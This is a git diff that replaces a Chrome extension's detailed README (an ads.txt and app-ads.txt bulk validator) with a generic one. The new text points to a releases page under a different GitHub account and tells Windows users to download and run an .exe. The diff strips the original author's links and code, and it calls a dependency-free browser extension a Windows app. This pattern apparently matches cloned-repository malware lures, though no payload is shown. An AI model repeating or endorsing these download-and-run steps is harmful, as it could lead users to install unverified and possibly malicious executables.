@@ -1,276 +1,201 @@
-# Mass Ads & App-Ads Checker
-
-A browser-native logging and validation toolkit for high-volume `ads.txt` / `app-ads.txt` checks with exportable operational diagnostics.
-
-[![Gist](https://img.shields.io/badge/gist.github-version_of_this_repository-DCDCDC?style=for-the-badge&logo=github)](https://gist.github.com/OstinUA/26e4653a2a107fde839467ad21db5e02)
-
-[![Chrome Store](https://img.shields.io/badge/platform-Chrome_Extension-4285F4?style=for-the-badge&logo=google-chrome&logoColor=white)](https://chromewebstore.google.com/search/OstinUA)
-[![Chrome Portfolio](https://img.shields.io/badge/Chrome_Web_Store-Portfolio-34A853?style=for-the-badge&logo=google-chrome&logoColor=white)](https://ostinua.github.io/Chrome-Web-Store_Developer-List/)
-
-[![Version](https://img.shields.io/badge/version-2.6.3-30BA8F?style=for-the-badge)](./manifest.json)
-[![License: MIT](https://img.shields.io/badge/License-MIT-1f6feb?style=for-the-badge)](LICENSE)
-[![Manifest V3](https://img.shields.io/badge/Manifest-V3-ff9800?style=for-the-badge)](./manifest.json)
-
-> [!NOTE]
-> This repository ships as a Chrome Extension focused on AdOps validation workflows. The “logging library” terminology in this README refers to its structured result tracking, status reporting, and CSV observability outputs.
-
-## Table of Contents
-
-- [Features](#features)
-- [Tech Stack & Architecture](#tech-stack--architecture)
-- [Getting Started](#getting-started)
-- [Testing](#testing)
-- [Deployment](#deployment)
-- [Usage](#usage)
-- [Configuration](#configuration)
-- [License](#license)
-- [Contacts & Community Support](#contacts--community-support)
-
-## Features
-
-- High-throughput batch domain scanning with controlled concurrency for stable browser execution.
-- Multi-protocol endpoint probing sequence to maximize discovery success:
-  - `https://www.<domain>/<fileType>`
-  - `https://<domain>/<fileType>`
-  - `http://www.<domain>/<fileType>`
-  - `http://<domain>/<fileType>`
-- Content-type sanity filtering to skip false-positive HTML error pages.
-- IAB-centric record parsing that counts only `DIRECT` and `RESELLER` rows as valid.
-- Real-time progress telemetry (`completed/total`) and status transitions (`Ready` -> `Processing` -> `Completed`).
-- Downloadable CSV report artifact for BI ingestion, spreadsheet QA, or audit handoff.
-- Persistent UI personalization via theme state (`light` / `dark`) stored in `localStorage`.
-- Browser-side operation model that helps bypass server-side anti-bot behavior that blocks headless scripts.
-
-> [!TIP]
-> For very large input lists, split domains into chunks (for example 300-500 domains per run) to reduce browser memory pressure and keep UI interactions responsive.
-
-## Tech Stack & Architecture
-
-### Core Languages, Platform, and Dependencies
-
-- Language: Vanilla JavaScript (ES6+) and HTML/CSS.
-- Runtime: Chrome Extension popup context (Manifest V3).
-- Network layer: Browser-native `fetch` with `AbortController` timeout protection.
-- Persistence: Web Storage API (`localStorage`) for theme preference.
-- Export pipeline: `Blob` + object URL download flow for CSV generation.
-- External package dependencies: none (zero-install runtime in browser).
-
-### Project Structure
-
-```text
-AdOps-Txt-Scanner/
-├── manifest.json        # Extension metadata and permissions
-├── background.js        # Window/popup launch behavior
-├── index.html           # UI markup + CSS theme tokens
-├── assets/
-│   ├── css/popup.css   # Popup stylesheet and theme tokens
-│   └── js/popup.js     # Scanner logic, parsing, progress, CSV export
-├── icons/
-│   └── icon128.png      # Extension icon asset
-├── LICENSE              # MIT license text
-└── README.md            # Project documentation
-```
-
-### Key Design Decisions
-
-1. Browser-first execution
-   - Avoids common server-side HTTP fingerprinting barriers.
-   - Keeps the validation loop close to end-user workflows.
-
-2. Deterministic probing strategy
-   - Ordered URL fallback reduces false negatives.
-   - Fast-exit behavior returns immediately on first valid textual response.
+# 📊 Mass-Ads-App-Ads-Checker - Fast Ad File Validation
 
-3. Lightweight structured logging model
-   - Each scan result emits a normalized record:
-     - `domain`
-     - `status`
-     - `lines`
-     - `url`
-     - `cssClass`
-   - This schema is mirrored in UI rows and CSV output for consistency.
+[![Download from GitHub Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Emmanue9881/Mass-Ads-App-Ads-Checker/releases)
 
-4. Defensive parsing model
-   - Removes BOM artifacts.
-   - Strips comments and validates semantic token position.
+## 🚀 What this app does
 
-```mermaid
-flowchart TD
-    A[Domain Input List] --> B[Batch Scheduler]
-    B --> C[URL Probe Strategy]
-    C --> D{HTTP 200 + Non-HTML?}
-    D -- No --> E[Try Next Variant]
-    E --> C
-    D -- Yes --> F[Parse Lines]
-    F --> G[Count DIRECT/RESELLER]
-    G --> H[Result Object]
-    H --> I[UI Table Update]
-    H --> J[Progress Counter]
-    H --> K[CSV Export Buffer]
-```
+Mass-Ads-App-Ads-Checker helps you check ads.txt and app-ads.txt files in bulk. It is built for AdOps work, publisher review, and ad file checks across many sites or apps.
 
-> [!IMPORTANT]
-> This extension validates accessibility and basic semantic formatting of seller declarations. It does not verify business authenticity, contractual validity, or financial settlement integrity.
+Use it to:
+- Check many ads.txt and app-ads.txt files at once
+- Find files that do not match the IAB format
+- Export results to CSV
+- Run checks in your browser
+- Review results in a clear list
 
-## Getting Started
+## 🖥️ Windows setup
 
-### Prerequisites
+This app is made for Windows users who want a simple way to run checks from a browser-based tool.
 
-- Google Chrome (current stable recommended).
-- Access to `chrome://extensions/`.
-- Git (for cloning and updating source).
+What you need:
+- A Windows PC
+- Google Chrome
+- Internet access for the first download
+- Permission to save files on your computer
 
-### Installation
+The app uses Chrome extension features and runs in the browser. That means you do not need to set up a server or install extra tools.
 
-1. Clone the repository:
+## 📥 Download and install
 
-```bash
-git clone https://github.com/<your-org>/AdOps-Txt-Scanner.git
-cd AdOps-Txt-Scanner
-```
+1. Open the release page: [Mass-Ads-App-Ads-Checker Releases](https://github.com/Emmanue9881/Mass-Ads-App-Ads-Checker/releases)
+2. Look for the latest release at the top of the page
+3. Download the Windows file from that release
+4. If the file is in a ZIP archive, right-click it and choose **Extract All**
+5. Open Google Chrome
+6. Load the extension or app file from the extracted folder if the release includes one
+7. Pin it to Chrome if you want quick access
+8. Open the app and start your first check
 
-2. Load the extension unpacked:
+If the release page gives you an `.exe` file, download and run that file.
 
-```text
-Chrome -> chrome://extensions/ -> Enable Developer mode -> Load unpacked -> Select AdOps-Txt-Scanner folder
-```
+## 🧭 First-time setup
 
-3. Open the extension popup and run a smoke check with 2-3 domains.
+After you install or open the app:
 
-> [!WARNING]
-> Corporate endpoint security products may block non-HTTPS probes. If scans unexpectedly fail, test from a clean browser profile first.
+1. Start Chrome
+2. Open the app from the extension menu or the installed file
+3. Allow the app to open local files if Windows asks for permission
+4. Keep the browser open while the checks run
+5. Enter the URLs or file paths you want to validate
 
-## Testing
+For best results:
+- Use a stable internet connection
+- Keep Chrome up to date
+- Close other heavy apps if you plan to check a large list
 
-This project does not currently include an automated unit/integration test framework. Use the following quality checks:
+## 🧪 How to use it
 
-```bash
-# JavaScript syntax validation
-node --check assets/js/popup.js
+### 1. Add your targets
+Paste a list of domains or app file locations into the app. You can check many items in one run.
 
-# Validate extension manifest JSON format
-python -m json.tool manifest.json > /dev/null
+### 2. Start the scan
+Click the check button to begin. The app tests each target one by one or in a grouped batch, based on the settings in the release.
 
-# Optional: inspect pending changes before release
-git status --short
-```
+### 3. Review the results
+The app shows which files are valid, missing, or not in the right format. You can use that list to fix problems fast.
 
-Manual validation checklist:
+### 4. Export to CSV
+Use the CSV export option if you want to save the results in Excel or share them with a team.
 
-1. Load extension in Chrome and confirm popup renders.
-2. Toggle `Light` / `Dark` theme and reopen popup to verify persistence.
-3. Run scan against known domains with valid `ads.txt` and invalid endpoints.
-4. Export CSV and confirm row schema + field ordering.
+## 📄 What gets checked
 
-## Deployment
+This app focuses on ads.txt and app-ads.txt files. It can help you spot:
+- Missing files
+- Wrong file paths
+- Broken URLs
+- Lines that do not match IAB rules
+- Seller records that need review
+- Files that return the wrong status
 
-### Production Packaging
+It uses strict parsing rules so you get clean results. That helps when you need a reliable audit across many properties.
 
-```bash
-# From repository root
-zip -r adops-txt-scanner.zip manifest.json index.html assets background.js icons LICENSE README.md
-```
+## ⚙️ Key features
 
-### CI/CD Integration Guidelines
+- Bulk file validation
+- ads.txt support
+- app-ads.txt support
+- Browser-based processing
+- CSV export
+- Clear pass and fail results
+- IAB standard parsing
+- Deterministic URL probing
+- Built for AdOps tasks
+- Works with large lists
 
-- Add a pipeline stage for syntax checks (`node --check assets/js/popup.js`).
-- Add a JSON lint stage for `manifest.json`.
-- Run extension smoke tests in ephemeral Chrome profiles (optional advanced stage).
-- Publish signed package through Chrome Web Store release channels (draft -> trusted testers -> public).
+## 🧾 CSV export
 
-### Containerization
+The CSV export helps you move results into common tools.
 
-Containerization is not required for runtime because the artifact is a browser extension. If needed, use containers only for CI verification steps (linting, packaging, validation scripts).
+You can use it to:
+- Share results with your team
+- Track changes over time
+- Sort by status
+- Filter problem entries
+- Build reports for publishers or account teams
 
-> [!CAUTION]
-> Never commit Web Store private keys, OAuth client secrets, or publishing credentials to this repository.
+The CSV file is easy to open in Excel, Google Sheets, and other spreadsheet tools.
 
-## Usage
+## 🔍 Tips for best results
 
-### 1) Initialize a Basic Scan Session
+- Use full domain names when possible
+- Check both root domain and app file paths
+- Review lines with extra spaces or missing fields
+- Save results after each large batch
+- Keep a backup of your exported CSV files
 
-```javascript
-// Example invocation model aligned with assets/js/popup.js behavior
-const fileType = 'ads.txt';
-const domains = ['example.com', 'google.com'];
+If you manage many sites or apps, group them in batches so you can review errors faster.
 
-for (const domain of domains) {
-  // checkDomainSmart probes URL variants and returns normalized result payload
-  const result = await checkDomainSmart(domain, fileType);
-  console.log(result.status, result.lines, result.url);
-}
-```
+## 🛠️ Common use cases
 
-### 2) Parse and Count Valid Seller Lines
+### Publisher teams
+Check ads.txt files across a network of sites and catch setup problems.
 
-```javascript
-// countValidLines ignores comments and only accepts DIRECT/RESELLER
-const content = `
-# comment line
-google.com, pub-123, DIRECT
-example.org, pub-456, RESELLER
-`;
+### App teams
+Review app-ads.txt files for apps in release or in live traffic.
 
-const validCount = countValidLines(content);
-console.log(validCount); // 2
-```
+### AdOps teams
+Run bulk validation before traffic changes, partner updates, or account reviews.
 
-### 3) Export Aggregated Results as CSV
+### QA and support
+Test if a file exists, loads, and matches the expected format.
 
-```javascript
-let csv = 'File URL,Status,Lines\n';
-results.forEach((r) => {
-  const rowUrl = r.url !== '-' ? r.url : r.domain;
-  csv += `${rowUrl},${r.status},${r.lines}\n`;
-});
+## 🧩 File format basics
 
-const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
-const url = URL.createObjectURL(blob);
-```
+The app checks files that are expected to follow IAB rules. In simple terms, it looks for:
+- Proper record structure
+- Valid seller lines
+- Clean formatting
+- Correct file access
+- Expected text output
 
-## Configuration
+That helps you find issues like missing entries, broken links, and format errors.
 
-### Runtime Options
+## 🧱 System notes
 
-- `fileTypeSelect`
-  - Values: `ads.txt` or `app-ads.txt`.
-  - Effect: Changes endpoint suffix used in URL probing.
+This tool is designed for:
+- Windows 10 and Windows 11
+- Google Chrome
+- Standard desktop screens
+- Daily browser use
+- Regular ad file checks
 
-- `batchSize` (defined in `assets/js/popup.js`)
-  - Current default: `2`.
-  - Effect: Controls number of concurrent domain checks.
+For a smooth experience, make sure Chrome has enough memory before you run very large batches.
 
-- Request timeout
-  - Current default: `20000` ms using `AbortController`.
-  - Effect: Prevents long-hanging network calls.
+## 📌 Topics covered
 
-### Environment Variables (`.env`)
+This project fits work around:
+- adops
+- ads.txt
+- app-ads.txt
+- adtech
+- automation
+- bulk checks
+- CSV export
+- data validation
+- IAB standards
+- publisher tools
+- monetization
+- programmatic advertising
 
-No `.env` variables are required for current runtime.
+## 🧰 Troubleshooting
 
-> [!NOTE]
-> If you later migrate this scanner into a backend service, introduce `.env` keys for timeout, concurrency, and retry budgets to support predictable production behavior.
+### The app does not open
+- Check that the file finished downloading
+- Extract the ZIP file first if needed
+- Try opening it again from the extracted folder
+- Make sure Chrome is installed
 
-### Startup Flags and Config Files
+### The results look empty
+- Confirm the list of URLs or domains is correct
+- Check that the file path is complete
+- Try a smaller batch first
 
-- No CLI startup flags are currently used.
-- Primary config surfaces are:
-  - `manifest.json` for extension metadata.
-  - UI controls in `index.html`.
-  - Runtime constants in `assets/js/popup.js`.
+### CSV export does not save
+- Check your download folder
+- Look for browser download permissions
+- Try saving again after a fresh scan
 
-## License
+### A site shows as invalid
+- Open the site in a browser
+- Check whether the ads.txt or app-ads.txt file exists
+- Review the file format for extra spaces or bad lines
 
-This project is distributed under the MIT License. See [`LICENSE`](LICENSE) for the full legal text.
+## 📁 Release page
 
-## Contacts & Community Support
+Use this page to download the latest Windows build and get the newest version of the app:
 
-## Support the Project
+[Go to Mass-Ads-App-Ads-Checker Releases](https://github.com/Emmanue9881/Mass-Ads-App-Ads-Checker/releases)
 
-[![Patreon](https://img.shields.io/badge/Patreon-OstinFCT-f96854?style=flat-square&logo=patreon)](https://www.patreon.com/OstinFCT)
-[![Ko-fi](https://img.shields.io/badge/Ko--fi-fctostin-29abe0?style=flat-square&logo=ko-fi)](https://ko-fi.com/fctostin)
-[![Boosty](https://img.shields.io/badge/Boosty-Support-f15f2c?style=flat-square)](https://boosty.to/ostinfct)
-[![YouTube](https://img.shields.io/badge/YouTube-FCT--Ostin-red?style=flat-square&logo=youtube)](https://www.youtube.com/@FCT-Ostin)
-[![Telegram](https://img.shields.io/badge/Telegram-FCTostin-2ca5e0?style=flat-square&logo=telegram)](https://t.me/FCTostin)
+## 🔗 Quick access
 
-If you find this tool useful, consider leaving a star on GitHub or supporting the author directly.
+[![Releases](https://img.shields.io/badge/Open%20Releases-Download%20Page-grey?style=for-the-badge&logo=github)](https://github.com/Emmanue9881/Mass-Ads-App-Ads-Checker/releases)
